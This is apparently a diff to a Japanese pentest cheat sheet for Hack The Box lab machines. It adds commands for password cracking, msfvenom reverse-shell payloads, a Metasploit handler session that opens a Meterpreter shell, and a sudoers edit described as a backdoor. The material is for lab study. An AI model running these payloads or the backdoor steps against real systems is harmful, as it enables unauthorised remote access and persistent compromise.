@@ -118,7 +118,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ### Meterpreterによるexploit確認
 セッションを残した状態で、実行
 ```
- msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
 msf5 post(multi/recon/local_exploit_suggester) > show options
 
 Module options (post/multi/recon/local_exploit_suggester):
@@ -211,6 +211,111 @@ dirbと同様に、ディレクトリ総当たりだが1階層のみで早い
 gobuster dir -e -u http://10.10.10.197:8080/ --wildcard  -w /usr/share/wordlists/dirb/common.txt
 ```
 
+## Password Crack
+### JohnTheRipper
+パスワード解析
+```
+John
+```
+
+
+### fcrackzip
+```
+fcrackzip -u -p <passwdFile> <File>
+fcrackzip -u -D -p <Dir/passwdFile> <File>
+```
+
+
+## Exploit
+### msfvenom
+各種ペイロード等作成できる
+リバースシェル用のペイロード作成例
+```
+kali@kali:~/SyachinekoLab/workspace/HTB/Devel$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.9 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2834 bytes
+Saved as: devel.aspx
+
+
+Meterpreterを用いないでペイロード作成
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode
+```
+
+### metasploit
+exploitツール
+metapreterによるリバースシェル接続の例
+```
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set LHOST 10.10.14.9
+LHOST => 10.10.14.9
+msf5 exploit(multi/handler) > set LPORT 1234
+LPORT => 1234
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:1234 
+[*] Sending stage (180291 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (10.10.14.9:1234 -> 10.10.10.5:49163) at 2020-06-26 09:56:55 -0400
+
+meterpreter > 
+
+```
+セッションをbackgroundコマンドで保持し、確認できる
+```
+meterpreter > background
+[*] Backgrounding session 3...
+msf5 exploit(multi/handler) > show sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information              Connection
+  --  ----  ----                     -----------              ----------
+  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.9:1234 -> 10.10.10.5:49157 (10.10.10.5)
+```
+
+### meterpreter
+専用シェル
+```
+meterpreter > background
+[*] Backgrounding session 3...
+msf5 exploit(multi/handler) > show sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information              Connection
+  --  ----  ----                     -----------              ----------
+  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.9:1234 -> 10.10.10.5:49157 (10.10.10.5)
+```
+
+
 ## 内部探査
 ### LinEnum
 Linuxの内部探査をしてくれるツール
@@ -260,6 +365,14 @@ wget http://<IP>:8080/<fileName>
 
 ```
 
+## sudoers書き換え
+```
+useradd test
+passwd test
+echo "test ALL=(ALL) ALL " >> /etc/sudoers
+# これでsshができればバックドアとなる
+```
+
 # 知らないことリスト
 
 # WriteUp
@@ -272,3 +385,6 @@ wget http://<IP>:8080/<fileName>
 
 [Cap](https://syachineko.hatenablog.com/entry/2021/10/16/202928)
 
+Beep
+
+Optimum
